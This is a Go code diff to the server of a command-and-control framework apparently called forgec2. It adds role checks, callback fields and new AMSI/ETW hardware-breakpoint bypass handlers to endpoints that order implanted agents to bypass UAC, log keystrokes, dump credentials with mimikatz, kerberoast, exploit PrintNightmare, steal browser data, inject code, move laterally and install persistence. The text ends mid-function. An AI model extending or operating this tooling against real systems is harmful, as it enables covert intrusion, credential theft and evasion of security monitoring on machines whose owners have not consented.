@@ -6,6 +6,7 @@ import (
 	"io"
 	"log/slog"
 	"net/http"
+	"strings"
 
 	"github.com/forgec2/forgec2/internal/db"
 	"github.com/gin-gonic/gin"
@@ -40,6 +41,8 @@ func (s *Server) handleSendCommand(c *gin.Context) {
 	id := c.Param("id")
 	cmd := c.PostForm("command")
 	shell := c.PostForm("shell")
+	callbackURL := c.PostForm("callback_url")
+	callbackMethod := c.PostForm("callback_method")
 	if shell == "" {
 		shell = "cmd.exe"
 	}
@@ -53,8 +56,20 @@ func (s *Server) handleSendCommand(c *gin.Context) {
 	task, err := s.createTask(id, "shell", cmd, shell, "", "", 0, 0)
 	if err != nil {
 		slog.Error("Failed to create task", "agent_id", id, "error", err)
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+		respondError(c, http.StatusInternalServerError, "failed to create task")
 		return
+	}
+
+	// Set callback fields if provided
+	if callbackURL != "" {
+		s.db.Model(&task).Updates(map[string]interface{}{
+			"callback_url":    callbackURL,
+			"callback_method": callbackMethod,
+		})
+		task.CallbackURL = callbackURL
+		if callbackMethod != "" {
+			task.CallbackMethod = callbackMethod
+		}
 	}
 
 	slog.Info("Task created successfully", "agent_id", id, "task_id", task.ID, "command", cmd)
@@ -77,7 +92,7 @@ func (s *Server) handleGetTaskStatus(c *gin.Context) {
 
 	var task db.Task
 	if err := s.db.Preload("Agent").First(&task, taskID).Error; err != nil {
-		c.JSON(http.StatusNotFound, gin.H{"error": "task not found"})
+		respondError(c, http.StatusNotFound, "task not found")
 		return
 	}
 
@@ -108,7 +123,7 @@ func (s *Server) handleSuspendProcess(c *gin.Context) {
 	}
 	task, err := s.createTask(id, "suspend", target, "", "", "", 0, 0)
 	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+		respondError(c, http.StatusInternalServerError, "failed to create task")
 		return
 	}
 	slog.Info("Suspend requested", "agent", id, "target", target)
@@ -126,7 +141,7 @@ func (s *Server) handleResumeProcess(c *gin.Context) {
 	}
 	task, err := s.createTask(id, "resume", target, "", "", "", 0, 0)
 	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+		respondError(c, http.StatusInternalServerError, "failed to create task")
 		return
 	}
 	slog.Info("Resume requested", "agent", id, "target", target)
@@ -144,7 +159,7 @@ func (s *Server) handleKillProcess(c *gin.Context) {
 	}
 	task, err := s.createTask(id, "killproc", target, "", "", "", 0, 0)
 	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+		respondError(c, http.StatusInternalServerError, "failed to create task")
 		return
 	}
 	slog.Info("Kill process requested", "agent", id, "target", target)
@@ -166,7 +181,7 @@ func (s *Server) handleClipboardSet(c *gin.Context) {
 	}
 	task, err := s.createTask(id, "clipboard_set", data, "", "", "", 0, 0)
 	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+		respondError(c, http.StatusInternalServerError, "failed to create task")
 		return
 	}
 	slog.Info("Clipboard set requested", "agent", id)
@@ -185,7 +200,7 @@ func (s *Server) handleFindFiles(c *gin.Context) {
 	}
 	task, err := s.createTask(id, "find", pattern, "", path, "", 0, 0)
 	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+		respondError(c, http.StatusInternalServerError, "failed to create task")
 		return
 	}
 	slog.Info("Find files requested", "agent", id, "path", path, "pattern", pattern)
@@ -203,7 +218,7 @@ func (s *Server) handleRegGet(c *gin.Context) {
 	}
 	task, err := s.createTask(id, "reg_get", key, "", "", "", 0, 0)
 	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+		respondError(c, http.StatusInternalServerError, "failed to create task")
 		return
 	}
 	slog.Info("Reg get requested", "agent", id, "key", key)
@@ -219,7 +234,7 @@ func (s *Server) handleRegSet(c *gin.Context) {
 	}
 	task, err := s.createTask(id, "reg_set", "", "", path, data, 0, 0)
 	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+		respondError(c, http.StatusInternalServerError, "failed to create task")
 		return
 	}
 	slog.Info("Reg set requested", "agent", id, "path", path)
@@ -237,7 +252,7 @@ func (s *Server) handleRegDelete(c *gin.Context) {
 	}
 	task, err := s.createTask(id, "reg_delete", key, "", "", "", 0, 0)
 	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+		respondError(c, http.StatusInternalServerError, "failed to create task")
 		return
 	}
 	slog.Info("Reg delete requested", "agent", id, "key", key)
@@ -275,7 +290,7 @@ func (s *Server) handlePortScan(c *gin.Context) {
 	}
 	task, err := s.createTask(id, "portscan", target, "", "", "", 0, 0)
 	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+		respondError(c, http.StatusInternalServerError, "failed to create task")
 		return
 	}
 	slog.Info("Portscan requested", "agent", id, "target", target)
@@ -306,7 +321,7 @@ func (s *Server) handleDownloadURL(c *gin.Context) {
 	}
 	task, err := s.createTask(id, "download_url", url, dest, dest, "", 0, 0)
 	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+		respondError(c, http.StatusInternalServerError, "failed to create task")
 		return
 	}
 	slog.Info("Download URL requested", "agent", id, "url", url)
@@ -319,7 +334,20 @@ func (s *Server) handleUninstall(c *gin.Context) {
 
 func (s *Server) handleSetSleep(c *gin.Context) {
 	id := c.Param("id")
-	sleep := c.PostForm("sleep")
+
+	var sleep string
+	if strings.Contains(c.ContentType(), "application/json") {
+		var req struct {
+			Interval int `json:"interval"`
+			Jitter   int `json:"jitter"`
+		}
+		if err := c.ShouldBindJSON(&req); err == nil {
+			sleep = fmt.Sprintf("%d,%d", req.Interval, req.Jitter)
+		}
+	}
+	if sleep == "" {
+		sleep = c.PostForm("sleep")
+	}
 	if sleep == "" {
 		sleep = c.PostForm("command")
 	}
@@ -328,7 +356,7 @@ func (s *Server) handleSetSleep(c *gin.Context) {
 	}
 	task, err := s.createTask(id, "set_sleep", sleep, "", "", "", 0, 0)
 	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+		respondError(c, http.StatusInternalServerError, "failed to create task")
 		return
 	}
 	slog.Info("Set sleep requested", "agent", id, "sleep", sleep)
@@ -336,6 +364,9 @@ func (s *Server) handleSetSleep(c *gin.Context) {
 }
 
 func (s *Server) handleElevate(c *gin.Context) {
+	if !s.requireOperator(c) {
+		return
+	}
 	id := c.Param("id")
 	cmd := c.PostForm("cmd")
 	if cmd == "" {
@@ -346,7 +377,7 @@ func (s *Server) handleElevate(c *gin.Context) {
 	}
 	task, err := s.createTask(id, "elevate", cmd, "", "", "", 0, 0)
 	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+		respondError(c, http.StatusInternalServerError, "failed to create task")
 		return
 	}
 	slog.Info("Elevate requested", "agent", id, "cmd", cmd)
@@ -354,10 +385,13 @@ func (s *Server) handleElevate(c *gin.Context) {
 }
 
 func (s *Server) handleUACBypass(c *gin.Context) {
+	if !s.requireOperator(c) {
+		return
+	}
 	id := c.Param("id")
 	method := c.PostForm("method")
 	if method == "" {
-		c.JSON(http.StatusBadRequest, gin.H{"error": "method is required (eventvwr, fodhelper, computerdefaults, sdclt, cmstp)"})
+		respondError(c, http.StatusBadRequest, "method is required (eventvwr, fodhelper, computerdefaults, sdclt, cmstp)")
 		return
 	}
 	payload := c.PostForm("payload")
@@ -368,7 +402,7 @@ func (s *Server) handleUACBypass(c *gin.Context) {
 	task, err := s.createTask(id, "uac_bypass", cmd, "", "", "", 0, 0)
 	if err != nil {
 		slog.Error("Failed to create uac_bypass task", "agent_id", id, "error", err)
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+		respondError(c, http.StatusInternalServerError, "failed to create task")
 		return
 	}
 	slog.Info("UAC bypass requested", "agent", id, "method", method)
@@ -382,6 +416,9 @@ func (s *Server) handleKillAV(c *gin.Context) {
 
 // Keylogger handlers (high-value addition)
 func (s *Server) handleStartKeylogger(c *gin.Context) {
+	if !s.requireOperator(c) {
+		return
+	}
 	id := c.Param("id")
 	if _, ok := s.getAgentOrFail(c, id); !ok {
 		return
@@ -390,7 +427,7 @@ func (s *Server) handleStartKeylogger(c *gin.Context) {
 	task, err := s.createTask(id, "keylogger_start", "", "", "", "", 0, 0)
 	if err != nil {
 		slog.Error("Failed to create keylogger start task", "agent_id", id, "error", err)
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+		respondError(c, http.StatusInternalServerError, "failed to create task")
 		return
 	}
 
@@ -400,6 +437,9 @@ func (s *Server) handleStartKeylogger(c *gin.Context) {
 }
 
 func (s *Server) handleStopKeylogger(c *gin.Context) {
+	if !s.requireOperator(c) {
+		return
+	}
 	id := c.Param("id")
 	if _, ok := s.getAgentOrFail(c, id); !ok {
 		return
@@ -408,7 +448,7 @@ func (s *Server) handleStopKeylogger(c *gin.Context) {
 	task, err := s.createTask(id, "keylogger_stop", "", "", "", "", 0, 0)
 	if err != nil {
 		slog.Error("Failed to create keylogger stop task", "agent_id", id, "error", err)
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+		respondError(c, http.StatusInternalServerError, "failed to create task")
 		return
 	}
 
@@ -418,6 +458,9 @@ func (s *Server) handleStopKeylogger(c *gin.Context) {
 }
 
 func (s *Server) handleDumpKeylogger(c *gin.Context) {
+	if !s.requireOperator(c) {
+		return
+	}
 	id := c.Param("id")
 	if _, ok := s.getAgentOrFail(c, id); !ok {
 		return
@@ -426,7 +469,7 @@ func (s *Server) handleDumpKeylogger(c *gin.Context) {
 	task, err := s.createTask(id, "keylogger_dump", "", "", "", "", 0, 0)
 	if err != nil {
 		slog.Error("Failed to create keylogger dump task", "agent_id", id, "error", err)
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+		respondError(c, http.StatusInternalServerError, "failed to create task")
 		return
 	}
 
@@ -442,6 +485,9 @@ func (s *Server) handleCredsDump(c *gin.Context) {
 }
 
 func (s *Server) handleInject(c *gin.Context) {
+	if !s.requireOperator(c) {
+		return
+	}
 	id := c.Param("id")
 	pidStr := c.PostForm("pid")
 	tech := c.PostForm("tech")
@@ -455,7 +501,7 @@ func (s *Server) handleInject(c *gin.Context) {
 	cmd := pidStr + "|" + tech
 	task, err := s.createTask(id, "inject", cmd, "", "", scB64, 0, 0)
 	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+		respondError(c, http.StatusInternalServerError, "failed to create task")
 		return
 	}
 	slog.Info("Inject requested", "agent", id, "pid", pidStr, "tech", tech)
@@ -463,6 +509,9 @@ func (s *Server) handleInject(c *gin.Context) {
 }
 
 func (s *Server) handleSpawn(c *gin.Context) {
+	if !s.requireOperator(c) {
+		return
+	}
 	id := c.Param("id")
 	target := c.PostForm("target")
 	if target == "" {
@@ -484,7 +533,7 @@ func (s *Server) handleSpawn(c *gin.Context) {
 	cmd := target + "|" + technique + "|" + b64Data
 	task, err := s.createTask(id, "spawn", cmd, "", "", "", 0, 0)
 	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+		respondError(c, http.StatusInternalServerError, "failed to create task")
 		return
 	}
 	slog.Info("Spawn requested", "agent", id, "target", target, "tech", technique, "size", size)
@@ -493,6 +542,9 @@ func (s *Server) handleSpawn(c *gin.Context) {
 }
 
 func (s *Server) handleLateral(c *gin.Context) {
+	if !s.requireOperator(c) {
+		return
+	}
 	id := c.Param("id")
 	spec := c.PostForm("spec")
 	if spec == "" {
@@ -503,7 +555,7 @@ func (s *Server) handleLateral(c *gin.Context) {
 	}
 	task, err := s.createTask(id, "lateral", spec, "", "", "", 0, 0)
 	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+		respondError(c, http.StatusInternalServerError, "failed to create task")
 		return
 	}
 	slog.Info("Lateral movement requested", "agent", id, "spec", spec)
@@ -511,6 +563,9 @@ func (s *Server) handleLateral(c *gin.Context) {
 }
 
 func (s *Server) handleSocks(c *gin.Context) {
+	if !s.requireOperator(c) {
+		return
+	}
 	id := c.Param("id")
 	port := c.PostForm("port")
 	if port == "" {
@@ -525,7 +580,7 @@ func (s *Server) handleSocks(c *gin.Context) {
 	// Command carries the listen port on the *agent*
 	task, err := s.createTask(id, "socks", port, "", "", "", 0, 0)
 	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+		respondError(c, http.StatusInternalServerError, "failed to create task")
 		return
 	}
 	slog.Info("SOCKS5 requested on agent", "agent", id, "port", port)
@@ -544,22 +599,22 @@ func (s *Server) handleCancelTask(c *gin.Context) {
 
 	var taskID uint
 	if _, err := fmt.Sscanf(taskIDStr, "%d", &taskID); err != nil {
-		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid task id"})
+		respondError(c, http.StatusBadRequest, "invalid task id")
 		return
 	}
 
 	var task db.Task
 	if err := s.db.First(&task, taskID).Error; err != nil {
-		c.JSON(http.StatusNotFound, gin.H{"error": "task not found"})
+		respondError(c, http.StatusNotFound, "task not found")
 		return
 	}
 	if task.AgentID != agentID {
-		c.JSON(http.StatusForbidden, gin.H{"error": "task belongs to different agent"})
+		respondError(c, http.StatusForbidden, "task belongs to different agent")
 		return
 	}
 
 	if task.Status != "pending" && task.Status != "running" {
-		c.JSON(http.StatusBadRequest, gin.H{"error": fmt.Sprintf("task is %s, cannot cancel", task.Status)})
+		respondError(c, http.StatusBadRequest, fmt.Sprintf("task is %s, cannot cancel", task.Status))
 		return
 	}
 
@@ -582,7 +637,7 @@ func (s *Server) handleRerunTask(c *gin.Context) {
 
 	role, _ := c.Get("user_role")
 	if role == "viewer" {
-		c.JSON(http.StatusForbidden, gin.H{"error": "viewers cannot rerun tasks"})
+		respondError(c, http.StatusForbidden, "viewers cannot rerun tasks")
 		return
 	}
 	if _, ok := s.getAgentOrFail(c, agentID); !ok {
@@ -591,19 +646,19 @@ func (s *Server) handleRerunTask(c *gin.Context) {
 
 	var taskID uint
 	if _, err := fmt.Sscanf(taskIDStr, "%d", &taskID); err != nil {
-		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid task id"})
+		respondError(c, http.StatusBadRequest, "invalid task id")
 		return
 	}
 
 	var original db.Task
 	if err := s.db.First(&original, taskID).Error; err != nil {
-		c.JSON(http.StatusNotFound, gin.H{"error": "original task not found"})
+		respondError(c, http.StatusNotFound, "original task not found")
 		return
 	}
 
 	// Only rerun tasks that belong to this agent
 	if original.AgentID != agentID {
-		c.JSON(http.StatusForbidden, gin.H{"error": "task belongs to different agent"})
+		respondError(c, http.StatusForbidden, "task belongs to different agent")
 		return
 	}
 
@@ -612,14 +667,14 @@ func (s *Server) handleRerunTask(c *gin.Context) {
 		"kill_agent": true, "screen_stream_start": true, "screen_stream_stop": true,
 	}
 	if noRerun[original.Type] {
-		c.JSON(http.StatusBadRequest, gin.H{"error": "cannot rerun this task type"})
+		respondError(c, http.StatusBadRequest, "cannot rerun this task type")
 		return
 	}
 
 	// Clone the original task parameters
 	newTask, err := s.createTask(agentID, original.Type, original.Command, original.Shell, original.Path, original.Data, original.Offset, original.Size)
 	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+		respondError(c, http.StatusInternalServerError, "failed to create task")
 		return
 	}
 
@@ -629,6 +684,9 @@ func (s *Server) handleRerunTask(c *gin.Context) {
 
 // 鈹€鈹€ execute-assembly: Upload and execute .NET assembly 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
 func (s *Server) handleExecuteAssembly(c *gin.Context) {
+	if !s.requireOperator(c) {
+		return
+	}
 	id := c.Param("id")
 	if _, ok := s.getAgentOrFail(c, id); !ok {
 		return
@@ -641,7 +699,7 @@ func (s *Server) handleExecuteAssembly(c *gin.Context) {
 
 	task, err := s.createTask(id, "execute_assembly", "", "", "", b64Data, 0, 0)
 	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+		respondError(c, http.StatusInternalServerError, "failed to create task")
 		return
 	}
 	slog.Info("Execute-assembly requested", "agent", id, "assembly", filename, "size", size)
@@ -651,13 +709,16 @@ func (s *Server) handleExecuteAssembly(c *gin.Context) {
 
 // 鈹€鈹€ kerberoast: Request TGS hashes for all SPNs 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
 func (s *Server) handleKerberoast(c *gin.Context) {
+	if !s.requireOperator(c) {
+		return
+	}
 	id := c.Param("id")
 	if _, ok := s.getAgentOrFail(c, id); !ok {
 		return
 	}
 	task, err := s.createTask(id, "kerberoast", "", "", "", "", 0, 0)
 	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+		respondError(c, http.StatusInternalServerError, "failed to create task")
 		return
 	}
 	slog.Info("Kerberoast requested", "agent", id)
@@ -667,6 +728,9 @@ func (s *Server) handleKerberoast(c *gin.Context) {
 
 // 鈹€鈹€ mimikatz: Run mimikatz command 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
 func (s *Server) handleMimikatz(c *gin.Context) {
+	if !s.requireOperator(c) {
+		return
+	}
 	id := c.Param("id")
 	command := c.PostForm("command")
 	if command == "" {
@@ -677,7 +741,7 @@ func (s *Server) handleMimikatz(c *gin.Context) {
 	}
 	task, err := s.createTask(id, "mimikatz", command, "", "", "", 0, 0)
 	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+		respondError(c, http.StatusInternalServerError, "failed to create task")
 		return
 	}
 	slog.Info("Mimikatz requested", "agent", id, "command", command)
@@ -687,10 +751,13 @@ func (s *Server) handleMimikatz(c *gin.Context) {
 
 // 鈹€鈹€ elevate_printnightmare: PrintNightmare exploit 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
 func (s *Server) handleElevatePrintNightmare(c *gin.Context) {
+	if !s.requireOperator(c) {
+		return
+	}
 	id := c.Param("id")
 	dllPath := c.PostForm("dll_path")
 	if dllPath == "" {
-		c.JSON(http.StatusBadRequest, gin.H{"error": "dll_path is required (upload a malicious DLL first via File Browser)"})
+		respondError(c, http.StatusBadRequest, "dll_path is required (upload a malicious DLL first via File Browser)")
 		return
 	}
 	if _, ok := s.getAgentOrFail(c, id); !ok {
@@ -698,7 +765,7 @@ func (s *Server) handleElevatePrintNightmare(c *gin.Context) {
 	}
 	task, err := s.createTask(id, "elevate_printnightmare", dllPath, "", "", "", 0, 0)
 	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+		respondError(c, http.StatusInternalServerError, "failed to create task")
 		return
 	}
 	slog.Info("PrintNightmare exploit requested", "agent", id, "dll", dllPath)
@@ -708,6 +775,9 @@ func (s *Server) handleElevatePrintNightmare(c *gin.Context) {
 
 // 鈹€鈹€ Persistence Toolkit 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
 func (s *Server) handlePersistence(c *gin.Context) {
+	if !s.requireOperator(c) {
+		return
+	}
 	id := c.Param("id")
 	action := c.PostForm("action")
 	method := c.PostForm("method")
@@ -720,13 +790,13 @@ func (s *Server) handlePersistence(c *gin.Context) {
 	switch action {
 	case "add":
 		if method == "" {
-			c.JSON(http.StatusBadRequest, gin.H{"error": "method is required"})
+			respondError(c, http.StatusBadRequest, "method is required")
 			return
 		}
 		cmd := method + "|" + binaryPath
 		task, err := s.createTask(id, "persistence_add", cmd, "", "", "", 0, 0)
 		if err != nil {
-			c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+			respondError(c, http.StatusInternalServerError, "failed to create task")
 			return
 		}
 		slog.Info("Persistence add requested", "agent", id, "method", method)
@@ -736,7 +806,7 @@ func (s *Server) handlePersistence(c *gin.Context) {
 	case "list":
 		task, err := s.createTask(id, "persistence_list", "", "", "", "", 0, 0)
 		if err != nil {
-			c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+			respondError(c, http.StatusInternalServerError, "failed to create task")
 			return
 		}
 		slog.Info("Persistence list requested", "agent", id)
@@ -745,13 +815,13 @@ func (s *Server) handlePersistence(c *gin.Context) {
 
 	case "remove":
 		if method == "" {
-			c.JSON(http.StatusBadRequest, gin.H{"error": "method is required"})
+			respondError(c, http.StatusBadRequest, "method is required")
 			return
 		}
 		cmd := method + "|" + binaryPath
 		task, err := s.createTask(id, "persistence_remove", cmd, "", "", "", 0, 0)
 		if err != nil {
-			c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+			respondError(c, http.StatusInternalServerError, "failed to create task")
 			return
 		}
 		slog.Info("Persistence remove requested", "agent", id, "method", method)
@@ -759,19 +829,22 @@ func (s *Server) handlePersistence(c *gin.Context) {
 		s.dispatchTask(c, task, "persistence_remove", method)
 
 	default:
-		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid action: must be add, list, or remove"})
+		respondError(c, http.StatusBadRequest, "invalid action: must be add, list, or remove")
 	}
 }
 
 // 鈹€鈹€ PowerPick: Execute PowerShell script in-process 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
 func (s *Server) handlePowerPick(c *gin.Context) {
+	if !s.requireOperator(c) {
+		return
+	}
 	id := c.Param("id")
 	script := c.PostForm("script")
 	if script == "" {
 		script = c.PostForm("command")
 	}
 	if script == "" {
-		c.JSON(http.StatusBadRequest, gin.H{"error": "script is required"})
+		respondError(c, http.StatusBadRequest, "script is required")
 		return
 	}
 	if _, ok := s.getAgentOrFail(c, id); !ok {
@@ -782,7 +855,7 @@ func (s *Server) handlePowerPick(c *gin.Context) {
 	task, err := s.createTask(id, "powerpick", b64Script, "", "", "", 0, 0)
 	if err != nil {
 		slog.Error("Failed to create powerpick task", "agent_id", id, "error", err)
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+		respondError(c, http.StatusInternalServerError, "failed to create task")
 		return
 	}
 
@@ -793,6 +866,9 @@ func (s *Server) handlePowerPick(c *gin.Context) {
 
 // 鈹€鈹€ Browser Data Theft 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
 func (s *Server) handleBrowserSteal(c *gin.Context) {
+	if !s.requireOperator(c) {
+		return
+	}
 	id := c.Param("id")
 	browser := c.PostForm("browser")
 	if browser == "" {
@@ -804,7 +880,7 @@ func (s *Server) handleBrowserSteal(c *gin.Context) {
 	task, err := s.createTask(id, "browser_steal", browser, "", "", "", 0, 0)
 	if err != nil {
 		slog.Error("Failed to create browser_steal task", "agent_id", id, "error", err)
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+		respondError(c, http.StatusInternalServerError, "failed to create task")
 		return
 	}
 	slog.Info("Browser data theft requested", "agent", id, "browser", browser)
@@ -817,7 +893,7 @@ func (s *Server) handleNetCommand(c *gin.Context) {
 	id := c.Param("id")
 	command := c.PostForm("command")
 	if command == "" {
-		c.JSON(http.StatusBadRequest, gin.H{"error": "command is required (e.g. view, group /domain, localgroup Administrators, user, accounts, share)"})
+		respondError(c, http.StatusBadRequest, "command is required (e.g. view, group /domain, localgroup Administrators, user, accounts, share)")
 		return
 	}
 	if _, ok := s.getAgentOrFail(c, id); !ok {
@@ -826,7 +902,7 @@ func (s *Server) handleNetCommand(c *gin.Context) {
 	task, err := s.createTask(id, "net", command, "", "", "", 0, 0)
 	if err != nil {
 		slog.Error("Failed to create net task", "agent_id", id, "error", err)
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+		respondError(c, http.StatusInternalServerError, "failed to create task")
 		return
 	}
 	slog.Info("Net command requested", "agent", id, "command", command)
@@ -835,6 +911,9 @@ func (s *Server) handleNetCommand(c *gin.Context) {
 }
 
 func (s *Server) handleBOF(c *gin.Context) {
+	if !s.requireOperator(c) {
+		return
+	}
 	id := c.Param("id")
 	if _, ok := s.getAgentOrFail(c, id); !ok {
 		return
@@ -848,7 +927,7 @@ func (s *Server) handleBOF(c *gin.Context) {
 
 	task, err := s.createTask(id, "bof", args, "", "", b64Data, 0, 0)
 	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+		respondError(c, http.StatusInternalServerError, "failed to create task")
 		return
 	}
 	slog.Info("BOF execution requested", "agent", id, "file", filename, "size", size, "args", args)
@@ -859,6 +938,9 @@ func (s *Server) handleBOF(c *gin.Context) {
 // 鈹€鈹€ AMSI/ETW Bypass 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
 
 func (s *Server) handleAMSIByPass(c *gin.Context) {
+	if !s.requireOperator(c) {
+		return
+	}
 	id := c.Param("id")
 	if _, ok := s.getAgentOrFail(c, id); !ok {
 		return
@@ -866,7 +948,7 @@ func (s *Server) handleAMSIByPass(c *gin.Context) {
 	task, err := s.createTask(id, "amsi_bypass", "", "", "", "", 0, 0)
 	if err != nil {
 		slog.Error("Failed to create amsi_bypass task", "agent_id", id, "error", err)
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+		respondError(c, http.StatusInternalServerError, "failed to create task")
 		return
 	}
 	slog.Info("AMSI bypass requested", "agent", id)
@@ -875,6 +957,9 @@ func (s *Server) handleAMSIByPass(c *gin.Context) {
 }
 
 func (s *Server) handleETWByPass(c *gin.Context) {
+	if !s.requireOperator(c) {
+		return
+	}
 	id := c.Param("id")
 	if _, ok := s.getAgentOrFail(c, id); !ok {
 		return
@@ -882,7 +967,7 @@ func (s *Server) handleETWByPass(c *gin.Context) {
 	task, err := s.createTask(id, "etw_bypass", "", "", "", "", 0, 0)
 	if err != nil {
 		slog.Error("Failed to create etw_bypass task", "agent_id", id, "error", err)
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+		respondError(c, http.StatusInternalServerError, "failed to create task")
 		return
 	}
 	slog.Info("ETW bypass requested", "agent", id)
@@ -890,13 +975,92 @@ func (s *Server) handleETWByPass(c *gin.Context) {
 	s.dispatchTask(c, task, "etw_bypass", "ETW Bypass")
 }
 
+func (s *Server) handleAMSIHardwareBP(c *gin.Context) {
+	if !s.requireOperator(c) {
+		return
+	}
+	id := c.Param("id")
+	if _, ok := s.getAgentOrFail(c, id); !ok {
+		return
+	}
+	task, err := s.createTask(id, "amsi_hardware_bp", "", "", "", "", 0, 0)
+	if err != nil {
+		slog.Error("Failed to create amsi_hardware_bp task", "agent_id", id, "error", err)
+		respondError(c, http.StatusInternalServerError, "failed to create task")
+		return
+	}
+	slog.Info("AMSI hardware breakpoint requested", "agent", id)
+	s.LogAuditRecord(c, "amsi_hardware_bp", "agent", id, "AMSI hardware breakpoint bypass requested", true, nil)
+	s.dispatchTask(c, task, "amsi_hardware_bp", "AMSI Hardware Breakpoint")
+}
+
+func (s *Server) handleETWHardwareBP(c *gin.Context) {
+	if !s.requireOperator(c) {
+		return
+	}
+	id := c.Param("id")
+	if _, ok := s.getAgentOrFail(c, id); !ok {
+		return
+	}
+	task, err := s.createTask(id, "etw_hardware_bp", "", "", "", "", 0, 0)
+	if err != nil {
+		slog.Error("Failed to create etw_hardware_bp task", "agent_id", id, "error", err)
+		respondError(c, http.StatusInternalServerError, "failed to create task")
+		return
+	}
+	slog.Info("ETW hardware breakpoint requested", "agent", id)
+	s.LogAuditRecord(c, "etw_hardware_bp", "agent", id, "ETW hardware breakpoint bypass requested", true, nil)
+	s.dispatchTask(c, task, "etw_hardware_bp", "ETW Hardware Breakpoint")
+}
+
+func (s *Server) handleSandboxDetectAdvanced(c *gin.Context) {
+	if !s.requireOperator(c) {
+		return
+	}
+	id := c.Param("id")
+	if _, ok := s.getAgentOrFail(c, id); !ok {
+		return
+	}
+	task, err := s.createTask(id, "sandbox_detect_advanced", "", "", "", "", 0, 0)
+	if err != nil {
+		slog.Error("Failed to create sandbox_detect_advanced task", "agent_id", id, "error", err)
